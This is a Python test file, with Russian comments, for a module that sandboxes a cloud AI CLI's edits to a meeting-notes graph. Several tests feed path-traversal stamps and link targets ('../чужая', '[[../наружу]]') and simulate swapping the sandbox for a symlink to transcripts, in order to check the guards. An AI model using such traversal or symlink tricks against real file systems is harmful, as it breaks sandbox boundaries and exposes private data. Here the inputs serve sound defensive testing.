    stamp = "2026-07-15_1400"
    graph = _graph(tmp_path)
    transcript, rev, log = _meeting(tmp_path)
    node = graph / "Встречи" / f"{stamp}.md"

    class Result:
        returncode = 0

    def fake_run(cmd, **kwargs):
        (pathlib.Path(kwargs["cwd"]) / "Встречи" / f"{stamp}.md").write_text(
            "# Встреча\nобогатило облако\n", encoding="utf-8")
        kwargs["stdout"].write(_REPORT)
        return Result()

    monkeypatch.setattr(cloud_review.subprocess, "run", fake_run)
    monkeypatch.setattr(cloud_review.graph_updater, "cloud_graph_available", lambda g: True)
    cfg = {"sufler": {"cloud_enrich": True, "cloud_edit_graph": True}}
    assert cloud_review.run(stamp, transcript, graph, rev, log, cfg) == 0
    assert node.read_text(encoding="utf-8") == "# Встреча\nобогатило облако\n", (
        "разрешённая правка не доехала из песочницы до графа"
    )
    assert "перенесено в граф: Встречи/2026-07-15_1400.md" in log.read_text(encoding="utf-8")

def test_the_sandbox_survives_a_per_file_transfer_failure(tmp_path, monkeypatch):
    """При v.failed песочница ОСТАЁТСЯ — там единственная копия черновика.

    Регрессия круга-1 (DS И1): правило было применено без теста и затёрлось
    при следующей крупной правке. Тест держит его на месте.
    """
    stamp = "2026-07-15_1400"
    graph = _graph(tmp_path)
    transcript, rev, log = _meeting(tmp_path)
    seen = {}

    class Result:
        returncode = 0

    def fake_run(cmd, **kwargs):
        pen = pathlib.Path(kwargs["cwd"]); seen["pen"] = pen
        (pen / "Встречи" / f"{stamp}.md").write_text("# правка\n", encoding="utf-8")
        kwargs["stdout"].write(_REPORT)
        return Result()

    def flaky(path, text, *a, **k):
        raise OSError(28, "No space left on device")
    monkeypatch.setattr(cloud_review.subprocess, "run", fake_run)
    monkeypatch.setattr(cloud_review.graph_updater, "cloud_graph_available", lambda g: True)
    monkeypatch.setattr(cloud_review.safe_write, "write_text", flaky)
    cfg = {"sufler": {"cloud_enrich": True, "cloud_edit_graph": True}}
    cloud_review.run(stamp, transcript, graph, rev, log, cfg)
    text = log.read_text(encoding="utf-8")
    # песочница не осталась в backup_root (её снёс бы следующий воркер) —
    # она в карантине, где живёт до forget_meeting (GLM И2)
    assert "черновик облака в карантине" in text
    # песочница ВНУТРИ каталога запуска (иначе forget_meeting её не найдёт)
    kept = list(cloud_review.quarantine_root(graph).glob("*/песочница"))
    assert kept and kept[0].is_dir(), "черновик облака не спрятан в карантин"
    # и forget_meeting реально её удаляет (PRIVACY: «забыть встречу» — GLM И1)
    import forget_meeting
    plan = forget_meeting.plan(stamp, cloud_review._root(), graph)
    kept_dir = kept[0].parent           # каталог запуска с песочницей внутри
    assert any(kept_dir == d or kept_dir in d.parents or d in kept_dir.parents
               for d in plan.delete), "forget_meeting не планирует удалить песочницу"


def test_a_failed_second_copy_cleans_its_orphans_and_spares_a_neighbour(tmp_path, monkeypatch):
    """Сбой создания песочницы: сироты убраны, ротация НЕ трогает соседа.

    Регрессия круга-1 (DS/luna И2). Проверяем и уборку частичных каталогов,
    и что ротация погашена (backup=None) — иначе она бы выполнилась после
    unlock и снесла снимки соседнего воркера.
    """
    stamp = "2026-07-15_1400"
    graph = _graph(tmp_path)
    transcript, rev, log = _meeting(tmp_path)
    monkeypatch.setattr(cloud_review, "_root", lambda _к=tmp_path / "data": _к)

    # сосед уже завёл свой снимок в том же корне
    root = cloud_review.backup_root(graph)
    neighbour = root / "2026-07-15_1500"
    neighbour.mkdir(parents=True, exist_ok=True)
    (neighbour / "живой.md").write_text("сосед", encoding="utf-8")

    real = cloud_review.backup_graph
    def half(g, s, source=None):
        if s.endswith("-облако"):
            (root / s).mkdir(parents=True, exist_ok=True)      # частичный каталог
            raise OSError(28, "No space left on device")
        return real(g, s, source=source)
    monkeypatch.setattr(cloud_review, "backup_graph", half)

    class Result:
        returncode = 0
    monkeypatch.setattr(cloud_review.subprocess, "run",
                        lambda cmd, **k: (k["stdout"].write(_REPORT), Result())[1])
    monkeypatch.setattr(cloud_review.graph_updater, "cloud_graph_available", lambda g: True)
    cfg = {"sufler": {"cloud_enrich": True, "cloud_edit_graph": True}}
    cloud_review.run(stamp, transcript, graph, rev, log, cfg)

    assert not (root / f"{stamp}-облако").exists(), "сирота песочницы не убрана"
    assert not (root / stamp).exists(), "сирота снимка не убрана"
    assert neighbour.is_dir(), "ротация снесла снимок соседа"

def test_pipeline_deleting_an_edited_file_is_a_conflict_not_a_violation(tmp_path):
    """Конвейер удалил файл, который облако правило, — это конфликт.

    DS M2 и luna круг-2: judge-ветка «existed and not gpath.exists()»
    приписывала облаку удаление, сделанное конвейером, и файл уходил в
    reverted вместо conflicts. Убрана — единый чек называет это конфликтом.
    """
    graph = _graph(tmp_path)
    node = graph / "Люди" / "Иванов.md"
    node.parent.mkdir(exist_ok=True)
    node.write_text("# Иванов\nбыло\n", encoding="utf-8")

    def worked(pen):
        (pen / "Люди" / "Иванов.md").write_text(
            "# Иванов\nоблако дописало\n", encoding="utf-8")
        node.unlink()                      # конвейер удалил из графа

    v, qdir = _cloud_worked(graph, tmp_path, worked)

    assert "Люди/Иванов.md" in v.conflicts, f"названо не конфликтом: {v}"
    assert "Люди/Иванов.md" not in v.reverted
    assert not node.exists(), "удалённый конвейером файл воскрешён"
    assert (qdir / "Люди" / "Иванов.md").is_file(), "версия облака не в карантине"

def test_a_file_the_cloud_never_touched_is_left_to_the_pipeline(tmp_path):
    """Файл, которого облако не касалось, перенос не трогает вовсе.

    GLM круг-2 (И1) закрыл окно по построению: базелин хешей снимается с
    самого снимка, песочница — тоже клон снимка. Файл, что облако не
    правило, в песочнице равен снимку и в дельту не попадает. Конвейер мог
    его удалить — перенос об этом просто не знает, и удаление остаётся.
    """
    graph = _graph(tmp_path)
    born = graph / "Встречи" / "рождённый_конвейером.md"
    born.write_text("# конвейер завёл\n", encoding="utf-8")

    def worked(pen):
        born.unlink()                    # конвейер убрал из графа; облако — мимо

    v, _ = _cloud_worked(graph, tmp_path, worked)

    assert not born.exists(), "перенос воскресил файл, которого облако не трогало"
    name = "Встречи/рождённый_конвейером.md"
    assert name not in v.applied and name not in v.conflicts and name not in v.reverted

def test_a_sandbox_gone_before_launch_drops_to_read_only_not_into_transcripts(tmp_path, monkeypatch):
    """Песочница исчезла ДО запуска CLI — работаем на чтение, не в стенограммах.

    GLM, круг-2 по #447 (Critical): без проверки cloud_enrich_workdir свалился
    бы фолбэком на папку стенограмм при живых Edit/Write, и облако писало бы в
    живые данные, а сверка по пустой песочнице видела бы ноль правок и
    доставляла ревизию как чистую. PRIVACY-граница пробита.
    """
    stamp = "2026-07-15_1400"
    graph = _graph(tmp_path)
    transcript, rev, log = _meeting(tmp_path)
    seen = {}

    real = cloud_review.backup_graph
    def snatch(g, s, source=None):
        dest = real(g, s, source=source)
        if s.endswith("-облако"):
            import shutil as _sh; _sh.rmtree(dest)   # внешняя рука унесла песочницу
        return dest

    class Result:
        returncode = 0
    def fake_run(cmd, **kwargs):
        seen["cwd"] = kwargs["cwd"]
        seen["cmd"] = " ".join(cmd)
        kwargs["stdout"].write(_REPORT)
        return Result()

    monkeypatch.setattr(cloud_review, "backup_graph", snatch)
    monkeypatch.setattr(cloud_review.subprocess, "run", fake_run)
    monkeypatch.setattr(cloud_review.graph_updater, "cloud_graph_available",
                        lambda g: pathlib.Path(g).is_dir())
    # сосед завёл свой снимок в том же backup_root, пока CLI работал read-only
    neighbour = cloud_review.backup_root(graph) / "2099-01-01_0000"
    neighbour.mkdir(parents=True, exist_ok=True)
    (neighbour / "живой.md").write_text("сосед", encoding="utf-8")
    cfg = {"sufler": {"cloud_enrich": True, "cloud_edit_graph": True}}
    cloud_review.run(stamp, transcript, graph, rev, log, cfg)
    assert neighbour.is_dir(), "ротация pre-check снесла снимок соседа (DS r4)"

    assert pathlib.Path(seen["cwd"]).resolve() != transcript.parent.resolve(), (
        "cwd свалился в папку стенограмм — облако писало бы в живые данные"
    )
    # Edit/Write при may_edit=False попадают в --disallowedTools (явный
    # запрет) — искать надо allow-правило Edit(/**), которого быть не должно.
    assert "Edit(/**)" not in seen["cmd"], "Edit-право выдано без песочницы"
    assert "правка графа" not in log.read_text(encoding="utf-8"), (
        "лог заявил правку графа, а песочницы нет"
    )

def test_a_redirect_stub_waits_for_its_canon_to_land(tmp_path):
    """Заглушку-редиректа не применяем, если её канон ушёл в карантин.

    GLM круг-2 (И3): облако мерджит дубль D в канон C и оставляет в D
    заглушку. Если C переписан заново (retention<1/3) и уехал в карантин,
    заглушка D применялась независимо — в графе редирект на узел без
    слитых фактов. Двухпроходный перенос держит заглушку до канона.
    """
    graph = _graph(tmp_path)
    body = "# Ядро\n## Статус\nРешено\n" + "".join(f"- факт {i}\n" for i in range(8))
    canon = graph / "Ядра" / "Платёжный провайдер.md"
    canon.write_text(body, encoding="utf-8")
    dup = graph / "Ядра" / "Провайдер платежей.md"
    dup.write_text(body.replace("Ядро", "Дубль"), encoding="utf-8")

    def worked(pen):
        # облако переписало канон ЗАНОВО (уйдёт в карантин по retention)…
        (pen / "Ядра" / "Платёжный провайдер.md").write_text(
            "# Ядро\nкороткое резюме облака\n", encoding="utf-8")
        # …и оставило в дубле заглушку-редирект на него
        (pen / "Ядра" / "Провайдер платежей.md").write_text(
            "# Провайдер платежей → [[Ядра/Платёжный провайдер]]\n\n"
            "Дубль. Смерджен.\n", encoding="utf-8")

    v, qdir = _cloud_worked(graph, tmp_path, worked)

    assert "Ядра/Платёжный провайдер.md" in v.reverted, "канон должен был в карантин"
    assert "Ядра/Провайдер платежей.md" in v.reverted, (
        "заглушка применена без своего канона — редирект в никуда"
    )
    assert dup.read_text(encoding="utf-8") == body.replace("Ядро", "Дубль"), (
        "дубль превращён в заглушку, хотя канон не слит"
    )


def test_a_redirect_stub_lands_when_its_canon_lands(tmp_path):
    """А при валидном слиянии заглушка проходит вместе с каноном."""
    graph = _graph(tmp_path)
    body = "# Ядро\n## Статус\nРешено\n" + "".join(f"- факт {i}\n" for i in range(8))
    canon = graph / "Ядра" / "Платёжный провайдер.md"
    canon.write_text(body, encoding="utf-8")
    dup = graph / "Ядра" / "Провайдер платежей.md"
    dup.write_text(body.replace("Ядро", "Дубль"), encoding="utf-8")

    def worked(pen):
        # канон дополнен (факты сохранены — retention высокий, пройдёт)…
        (pen / "Ядра" / "Платёжный провайдер.md").write_text(
            body + "- факт из дубля\n", encoding="utf-8")
        (pen / "Ядра" / "Провайдер платежей.md").write_text(
            "# Провайдер платежей → [[Ядра/Платёжный провайдер]]\n\n"
            "Дубль. Смерджен.\n", encoding="utf-8")

    v, _ = _cloud_worked(graph, tmp_path, worked)

    assert "Ядра/Платёжный провайдер.md" in v.applied
    assert "Ядра/Провайдер платежей.md" in v.applied
    assert dup.read_text(encoding="utf-8").startswith("# Провайдер платежей → [[")

def test_a_redirect_stub_is_recognised_with_ascii_arrow_and_yaml_frontmatter(tmp_path):
    """Заглушка распознаётся и с `->`, и с длинным frontmatter (GLM M1+M3).

    Раньше стрелка ловилась только по U+2192, а длина мерилась до срезания
    frontmatter — узел с YAML-шапкой и ASCII-стрелкой проваливался в
    «переписан заново» и слияние уходило в карантин, оставляя два дубля.
    """
    stub = cloud_review.is_redirect_stub
    assert stub("# Дубль -> [[Ядра/Канон]]\n")
    assert stub("---\naliases: [Провайдер, Оплата]\ntags: [ядро, оплата]\n"
                "created: 2026-08-28\n" + "note: x\n" * 40 + "---\n"
                "# Дубль → [[Ядра/Канон]]\n")
    assert cloud_review._stub_target("# Д -> [[Ядра/Канон]]\n") == "Ядра/Канон.md"
    # стрелка во frontmatter НЕ должна перебить цель из тела (DS, круг-4)
    assert cloud_review._stub_target(
        "---\nrelated: см. → [[Другое]]\n---\n# Дубль → [[Ядра/Канон]]\n"
    ) == "Ядра/Канон.md"

def test_a_sandbox_swapped_for_a_symlink_drops_to_read_only(tmp_path, monkeypatch):
    """Песочницу подменили симлинком на стенограммы — не пишем в живые данные.

    luna круг-4 (Critical): симлинк проходит is_dir(), а cloud_enrich_workdir
    разыменовал бы его в папку стенограмм при живых Edit/Write. Теперь
    симлинк отвергается в pre-check, а в write-режиме фолбэка в стенограммы
    нет вовсе — cwd только реальная песочница.
    """
    stamp = "2026-07-15_1400"
    graph = _graph(tmp_path)
    transcript, rev, log = _meeting(tmp_path)
    seen = {}

    real = cloud_review.backup_graph
    def swap(g, s, source=None):
        dest = real(g, s, source=source)
        if s.endswith("-облако"):
            import shutil as _sh
            _sh.rmtree(dest)
            dest.symlink_to(transcript.parent)     # подмена симлинком на стенограммы
        return dest

    class Result:
        returncode = 0
    def fake_run(cmd, **kwargs):
        seen["cwd"] = kwargs["cwd"]; seen["cmd"] = " ".join(cmd)
        kwargs["stdout"].write(_REPORT)
        return Result()

    monkeypatch.setattr(cloud_review, "backup_graph", swap)
    monkeypatch.setattr(cloud_review.subprocess, "run", fake_run)
    monkeypatch.setattr(cloud_review.graph_updater, "cloud_graph_available",
                        lambda g: pathlib.Path(g).is_dir())
    cfg = {"sufler": {"cloud_enrich": True, "cloud_edit_graph": True}}
    cloud_review.run(stamp, transcript, graph, rev, log, cfg)

    assert pathlib.Path(seen["cwd"]).resolve() != transcript.parent.resolve(), (
        "cwd ушёл в стенограммы через подменённый симлинк"
    )
    assert "Edit(/**)" not in seen["cmd"], "Edit-право выдано на подменённую песочницу"

def test_a_stub_pointing_to_a_canon_in_the_same_folder_lands(tmp_path):
    """Заглушка `[[Канон]]` без папки находит канон рядом (GLM круг-4 И2).

    Частая форма Obsidian, когда дубль и канон в одной папке. Цель тогда
    «Канон.md», а применённый канон — «Ядра/Канон.md»: без резолва от папки
    заглушки слияние отбраковывалось, оба узла оставались, канон задваивался.
    """
    graph = _graph(tmp_path)
    body = "# Ядро\n## Статус\nРешено\n" + "".join(f"- факт {i}\n" for i in range(8))
    canon = graph / "Ядра" / "Канон.md"
    canon.write_text(body, encoding="utf-8")
    dup = graph / "Ядра" / "Дубль.md"
    dup.write_text(body.replace("Ядро", "Дубль"), encoding="utf-8")

    def worked(pen):
        (pen / "Ядра" / "Канон.md").write_text(body + "- факт из дубля\n", encoding="utf-8")
        (pen / "Ядра" / "Дубль.md").write_text(
            "# Дубль → [[Канон]]\n\nДубль. Смерджен.\n", encoding="utf-8")

    v, _ = _cloud_worked(graph, tmp_path, worked)

    assert "Ядра/Дубль.md" in v.applied, "заглушка на канон рядом отбракована"
    assert "Ядра/Дубль.md" not in v.reverted
    assert dup.read_text(encoding="utf-8").startswith("# Дубль → [[")



def test_a_stub_pointing_outside_the_graph_never_lands(tmp_path):
    """Заглушка `[[../наружу]]` не применяется, даже если «наружу.md» лежит
    и за графом, и тёзкой рядом с заглушкой (luna круг-5 И1, DS M3).

    `pathlib.Path(target).name` стирал `..` и каталоги: для корневого дубля
    локальный кандидат «наружу.md» совпадал с чужим узлом графа, а
    «../наружу.md» резолвился в файл ЗА границей графа — оба пускали
    редирект на цель, которой в графе нет. Теперь локальный кандидат —
    только для bare-имени, а каждый кандидат проходит may_write.
    """
    graph = _graph(tmp_path)
    body = "# Дубль\n## Статус\nРешено\n" + "".join(f"- факт {i}\n" for i in range(8))
    dup = graph / "Дубль.md"
    dup.write_text(body, encoding="utf-8")
    (graph / "наружу.md").write_text("# Тёзка в графе\n", encoding="utf-8")
    (graph.parent / "наружу.md").write_text("# За границей графа\n", encoding="utf-8")

    def worked(pen):
        (pen / "Дубль.md").write_text("# Дубль → [[../наружу]]\n\nСмерджен.\n",
                                       encoding="utf-8")

    v, _ = _cloud_worked(graph, tmp_path, worked)

    assert "Дубль.md" in v.reverted, "редирект за границу графа применён"
    assert "Дубль.md" not in v.applied
    assert dup.read_text(encoding="utf-8") == body, "дубль превращён в заглушку наружу"


def test_a_stub_with_a_folder_does_not_settle_for_a_namesake_next_door(tmp_path):
    """`[[Ядра/Канон]]` с явной папкой не подменяется тёзкой рядом с заглушкой
    (DS круг-5 M2).

    Фолбэк «канон рядом с заглушкой» строился безусловно: для цели с папкой
    он давал ДРУГОЙ узел, и когда настоящий канон уехал в карантин
    (переписан заново), а тёзка рядом цела, заглушка применялась —
    редирект на неслитый канон.
    """
    graph = _graph(tmp_path)
    body = "# Ядро\n## Статус\nРешено\n" + "".join(f"- факт {i}\n" for i in range(8))
    (graph / "Ядра" / "Канон.md").write_text(body, encoding="utf-8")
    (graph / "Люди").mkdir()
    dup = graph / "Люди" / "Дубль.md"
    dup.write_text(body.replace("Ядро", "Дубль"), encoding="utf-8")
    (graph / "Люди" / "Канон.md").write_text("# Тёзка, не тот узел\n", encoding="utf-8")

    def worked(pen):
        # канон переписан заново — уйдёт в карантин по retention…
        (pen / "Ядра" / "Канон.md").write_text("# Ядро\nкороткое резюме\n", encoding="utf-8")
        # …а заглушка указывает на него с явной папкой
        (pen / "Люди" / "Дубль.md").write_text(
            "# Дубль → [[Ядра/Канон]]\n\nСмерджен.\n", encoding="utf-8")

    v, _ = _cloud_worked(graph, tmp_path, worked)

    assert "Ядра/Канон.md" in v.reverted, "канон должен был в карантин"
    assert "Люди/Дубль.md" in v.reverted, "заглушка встала на тёзку рядом, канон не слит"
    assert dup.read_text(encoding="utf-8") == body.replace("Ядро", "Дубль")


def test_a_sandbox_swapped_mid_run_is_not_transferred(tmp_path, monkeypatch):
    """Песочницу подменили симлинком на стенограммы, ПОКА CLI работал, —
    перенос не идёт, стенограммы не становятся «правками облака» (DS круг-5 И1).

    Гард в finally проверял is_dir(), а он идёт ПО симлинку: подмена в окне
    прогона (до TIMEOUT) проходила гард, и apply_from_copy обходил цель
    ссылки как песочницу — файлы встречи легли бы в граф узлами облака.
    Повтор того же штампа после подмены снова правит граф: backup_graph
    снимает ссылку на месте своего снимка, а не падает в «не удаляется».
    """
    stamp = "2026-07-15_1400"
    graph = _graph(tmp_path)
    transcript, rev, log = _meeting(tmp_path)

    class Result:
        returncode = 0
    def swap_run(cmd, **kwargs):
        pen = pathlib.Path(kwargs["cwd"])
        import shutil as _sh
        _sh.rmtree(pen)
        pen.symlink_to(transcript.parent)      # подмена во время прогона
        kwargs["stdout"].write(_REPORT)
        return Result()
    def quiet_run(cmd, **kwargs):
        kwargs["stdout"].write(_REPORT)
        return Result()

    monkeypatch.setattr(cloud_review.subprocess, "run", swap_run)
    monkeypatch.setattr(cloud_review.graph_updater, "cloud_graph_available",
                        lambda g: pathlib.Path(g).is_dir())
    cfg = {"sufler": {"cloud_enrich": True, "cloud_edit_graph": True}}
    code = cloud_review.run(stamp, transcript, graph, rev, log, cfg)

    text = log.read_text(encoding="utf-8")
    assert "СНИМОК ИЛИ ПЕСОЧНИЦА ИСЧЕЗЛИ" in text, "подмена прошла гард finally"
    assert "перенесено в граф" not in text
    assert not (graph / f"{stamp}.md").exists(), "стенограмма перенесена в граф узлом облака"
    assert transcript.read_text(encoding="utf-8") == "текст\n", "стенограмма тронута"
    assert code == 1, "граф не сверен — код обязан быть ненулевым"

    monkeypatch.setattr(cloud_review.subprocess, "run", quiet_run)
    cloud_review.run(stamp, transcript, graph, rev, log, cfg)
    assert log.read_text(encoding="utf-8").count("режим правка графа") == 2, (
        "повтор штампа после подмены не вернулся к правке графа"
    )


def test_a_sandbox_swapped_before_launch_leaves_no_orphans_and_frees_the_stamp(tmp_path, monkeypatch):
    """Подмена песочницы перед стартом: команда собирается ПОСЛЕ проверки,
    свои снимок и ссылка убраны, повтор штампа снова правит граф.

    luna круг-5 (Critical + И2): проверка стояла после сборки промпта и
    команды — при отказе CLI получал бы Edit при cwd=настоящий граф; а
    ссылка оставалась в backup_root, и повтор штампа падал в «старый снимок
    не удаляется». DS M4: полный снимок лежал сиротой до чужой ротации.
    """
    stamp = "2026-07-15_1400"
    graph = _graph(tmp_path)
    transcript, rev, log = _meeting(tmp_path)
    seen = {}

    real_ctx = cloud_review.graph_updater.cloud_enrich_context
    def swap_then_context(folder, stem):
        # окно между созданием песочницы и стартом CLI: подмена ссылкой
        pen = cloud_review.backup_root(graph) / f"{stamp}-облако"
        if pen.is_dir() and not pen.is_symlink():
            import shutil as _sh
            _sh.rmtree(pen)
            pen.symlink_to(transcript.parent)
        return real_ctx(folder, stem)

    class Result:
        returncode = 0
    def fake_run(cmd, **kwargs):
        seen["cwd"] = kwargs["cwd"]; seen["cmd"] = " ".join(cmd)
        kwargs["stdout"].write(_REPORT)
        return Result()

    monkeypatch.setattr(cloud_review.graph_updater, "cloud_enrich_context", swap_then_context)
    monkeypatch.setattr(cloud_review.subprocess, "run", fake_run)
    monkeypatch.setattr(cloud_review.graph_updater, "cloud_graph_available",
                        lambda g: pathlib.Path(g).is_dir())
    cfg = {"sufler": {"cloud_enrich": True, "cloud_edit_graph": True}}
    cloud_review.run(stamp, transcript, graph, rev, log, cfg)

    assert "Edit(/**)" not in seen["cmd"], (
        "команда собрана ДО проверки песочницы — Edit при cwd=настоящий граф"
    )
    assert pathlib.Path(seen["cwd"]).resolve() != transcript.parent.resolve()
    root = cloud_review.backup_root(graph)
    assert not (root / f"{stamp}-облако").is_symlink(), "ссылка-подмена оставлена в backup_root"
    assert not (root / stamp).exists(), "полный снимок лежит сиротой (DS M4)"
    assert "режим правка графа" not in log.read_text(encoding="utf-8")

    # повтор того же штампа без подмены — снова полноценная правка
    monkeypatch.setattr(cloud_review.graph_updater, "cloud_enrich_context", real_ctx)
    cloud_review.run(stamp, transcript, graph, rev, log, cfg)
    assert "режим правка графа" in log.read_text(encoding="utf-8"), "штамп не освободился"


def test_a_stamp_that_is_a_path_never_leaves_the_snapshot_root(tmp_path, monkeypatch):
    """Штамп ложится в путь снимка и песочницы — `/x`, `../x`, `a/b` не
    выходят за backup_root (luna круг-6).

    `root / stamp` с абсолютным или относительным путём уводил rmtree и
    unlink за каталог снимков: чужая ссылка исчезала, а на её месте
    вырастала копия графа. Теперь штамп обязан быть одним именем
    каталога — и в backup_graph, и в уборке своих артефактов, и на входе
    воркера, до замка.
    """
    import pytest
    graph = _graph(tmp_path)
    target = tmp_path / "цель"; target.mkdir()
    foreign = tmp_path / "чужая"
    foreign.symlink_to(target)                      # чужая ссылка вне снимков
    transcript, rev, log = _meeting(tmp_path)

    for bad in (str(foreign), "../чужая", "a/b", "a\\b", ".", "..", ".скрытый", ""):
        with pytest.raises(ValueError):
            cloud_review.backup_graph(graph, bad)
        with pytest.raises(ValueError):
            cloud_review._drop_own_snapshots(graph, bad)

    def never_run(cmd, **kwargs):
        raise AssertionError("CLI запущен с кривым штампом")
    monkeypatch.setattr(cloud_review.subprocess, "run", never_run)
    cfg = {"sufler": {"cloud_enrich": True, "cloud_edit_graph": True}}
    assert cloud_review.run(str(foreign), transcript, graph, rev, log, cfg) == 1
    assert cloud_review.run("../чужая", transcript, graph, rev, log, cfg) == 1

    assert foreign.is_symlink() and target.is_dir(), "чужая ссылка или её цель тронуты"
    assert not (foreign / "Ядра").exists(), "на месте чужой ссылки выросла копия графа"
    # обычный штамп по-прежнему даёт снимок внутри backup_root
    dest = cloud_review.backup_graph(graph, "2026-07-15_1400")
    assert dest.parent == cloud_review.backup_root(graph) and dest.is_dir()


def test_cloud_links_wrapped_over_lines_are_joined_on_transfer(tmp_path):
    """CLI переносит длинный абзац посреди [[…]] — для Obsidian ссылка мертва
    (63 таких в графе, аудит 28.08). Склеиваем в точке переноса в граф."""
    graph = _graph(tmp_path)
    body = "# Ядро\n## Статус\nРешено\n" + "".join(f"- факт {i}\n" for i in range(8))
    core = graph / "Ядра" / "Платёжный провайдер.md"
    core.write_text(body, encoding="utf-8")
    # цели ссылок обязаны существовать: с 07.09 ссылка без узла становится текстом
    (graph / "Системы").mkdir()
    (graph / "Системы" / "Система 1593.md").write_text("# Система 1593\n", encoding="utf-8")
    (graph / "Люди").mkdir()
    (graph / "Люди" / "Иван Иванов.md").write_text("# Иван Иванов\n", encoding="utf-8")

    def worked(pen):
        (pen / "Ядра" / "Платёжный провайдер.md").write_text(
            body + "- см. [[Системы/Система\n  1593|систему 1593]] и [[Люди/Иван\nИванов]]\n",
            encoding="utf-8")

    v, _ = _cloud_worked(graph, tmp_path, worked)
    assert "Ядра/Платёжный провайдер.md" in v.applied
    text = core.read_text(encoding="utf-8")
    assert "[[Системы/Система 1593|систему 1593]]" in text and "[[Люди/Иван Иванов]]" in text
    assert "\n  1593" not in text


def test_cloud_links_without_a_node_become_text_on_transfer(tmp_path):
    """Аудит памяти 07.09 (GLM Critical 1): облако писало `[[Понятие]]` без
    узла, и заметка ложилась в граф с битой ссылкой — единственный открытый
    канал после гейтов конвейера. Цель ищется в живом графе и среди узлов,
    которые облако создало в этом же прогоне; остальное — текст, с логом."""
    graph = _graph(tmp_path)
    (graph / "Люди").mkdir()
    (graph / "Люди" / "Иван Иванов.md").write_text(
        "---\naliases: [Ваня]\n---\n# Иван Иванов\n", encoding="utf-8")
    body = "# Ядро\n## Статус\nРешено\n" + "".join(f"- факт {i}\n" for i in range(8))
    core = graph / "Ядра" / "Платёжный провайдер.md"
    core.write_text(body, encoding="utf-8")

    def worked(pen):
        (pen / "Системы").mkdir()
        (pen / "Системы" / "Новая витрина.md").write_text("# Новая витрина\n", encoding="utf-8")
        (pen / "Ядра" / "Платёжный провайдер.md").write_text(
            body + "- [[Люди/Иван Иванов]] и [[Ваня]] про [[Системы/Новая витрина]], "
                   "[[Kwen 32B]] и [[Перенос на завтра|перенос]];\n```\n[[в коде]]\n```\n",
            encoding="utf-8")

    v, _ = _cloud_worked(graph, tmp_path, worked)
    text = core.read_text(encoding="utf-8")
    assert "[[Люди/Иван Иванов]]" in text and "[[Ваня]]" in text, "узел и его псевдоним — живые цели"
    assert "[[Системы/Новая витрина]]" in text, "узел, созданный облаком в этом же прогоне, — живая цель"
    assert "Kwen 32B" in text and "[[Kwen 32B]]" not in text
    assert " перенос;" in text and "[[Перенос на завтра" not in text
    assert "[[в коде]]" in text, "внутри огороженного блока кода ссылки не трогаются"
    assert v.unlinked == ["Ядра/Платёжный провайдер.md: Kwen 32B, Перенос на завтра"], v.unlinked
    assert "ссылки без узла стали текстом" in cloud_review._verdict_line(v, tmp_path / "q")


def test_cli_failure_is_retried_once_after_a_pause_and_outside_a_live_meeting(tmp_path, monkeypatch):
    """№240: упавший запуск CLI или оборванный ответ повторяются один раз
    через паузу, не под живой встречей; таймаут не повторяется; второй
    сбой подряд останавливает с честной строкой."""
    log = tmp_path / "cloud.log"
    transcript = tmp_path / "t.md"
    transcript.write_text("текст\n", encoding="utf-8")
    rev = tmp_path / "r.md"
    calls: list[int] = []
    events: list[str] = []
    monkeypatch.setattr(cloud_review, "_sleep", lambda s: events.append(f"sleep {s}"))
    monkeypatch.setattr(cloud_review.live_gate, "wait_while_live",
                        lambda root, log=print, **kw: (events.append("gate"), log("повтор ревизии: живой встречи нет"), False)[2])
    monkeypatch.setattr(cloud_review, "_review_stage", lambda *a, **k: None)

    def once(*args, **kw):
        calls.append(len(calls))
        return outcomes[len(calls) - 1]

    monkeypatch.setattr(cloud_review, "_run_once", once)
    outcomes = [cloud_review.RC_CLI, cloud_review.RC_OK]
    assert cloud_review.run("2026-07-15_1400", transcript, tmp_path / "g", rev, log, {}) == 0
    assert len(calls) == 2 and events == ["gate", f"sleep {cloud_review.RETRY_DELAY}", "gate"], \
        "живой гейт до паузы и после неё (DS r1 M3)"
    text = log.read_text(encoding="utf-8")
    assert "повтор ревизии через 10 мин" in text and "живой встречи нет" in text
    calls.clear(); events.clear(); log.unlink()
    outcomes = [cloud_review.RC_TIMEOUT]
    assert cloud_review.run("2026-07-15_1400", transcript, tmp_path / "g", rev, log, {}) == cloud_review.RC_TIMEOUT
    assert len(calls) == 1 and not events and "таймаут — повтор не поможет" in log.read_text(encoding="utf-8")
    calls.clear(); log.unlink()
    outcomes = [cloud_review.RC_ERROR]
    assert cloud_review.run("2026-07-15_1400", transcript, tmp_path / "g", rev, log, {}) == cloud_review.RC_ERROR
    assert len(calls) == 1 and not events, "ответ с кодом 0, не похожий на ревизию, не повторяется"
    outcomes = [cloud_review.RC_CLI, cloud_review.RC_CLI]
    calls.clear()
    assert cloud_review.run("2026-07-15_1400", transcript, tmp_path / "g", rev, log, {}) == cloud_review.RC_CLI
    assert len(calls) == 2 and "повтор не помог" in log.read_text(encoding="utf-8")
    # статуса нет вовсе (старая встреча, ручной запуск): свежая ревизия отменяет
    # повтор, как и до 13.09 — этапов у таких встреч не бывает (DS r1 I2 по #556)
    from meeting_processing import MeetingStatusStore
    monkeypatch.setattr(cloud_review, "_root", lambda _к=tmp_path / "data": _к)
    calls.clear(); events.clear(); log.unlink()
    rev.write_text("# Ревизия\n", encoding="utf-8")
    outcomes = [cloud_review.RC_CLI, cloud_review.RC_OK]
    assert cloud_review.run("2026-07-15_1400", transcript, tmp_path / "g", rev, log, {}) == cloud_review.RC_OK
    assert len(calls) == 1 and "повтор не нужен" in log.read_text(encoding="utf-8")
    # этап ведётся и он «running» (сосед опубликовал файл и убит до доставки):
    # свежести файла мало, повтор идёт (аудит 13.09, DS I2 / GLM M2)
    store = MeetingStatusStore(tmp_path / "data")
    store.processing(transcript, "ревизия")
    store.review(transcript, "running")
    calls.clear(); events.clear(); log.unlink()
    outcomes = [cloud_review.RC_CLI, cloud_review.RC_OK]
    assert cloud_review.run("2026-07-15_1400", transcript, tmp_path / "g", rev, log, {}) == cloud_review.RC_OK
    assert len(calls) == 2, "ревизия соседа без этапа «ok» — не доставка"
    # сосед закрыл этап во время паузы — повтор отменяется (GLM r1 I2)
    store.review(transcript, "running")
    monkeypatch.setattr(cloud_review, "_sleep", lambda s: (events.append(f"sleep {s}"), store.review(transcript, "ok")))
    calls.clear(); events.clear(); log.unlink()
    outcomes = [cloud_review.RC_CLI, cloud_review.RC_OK]
    assert cloud_review.run("2026-07-15_1400", transcript, tmp_path / "g", rev, log, {}) == cloud_review.RC_OK
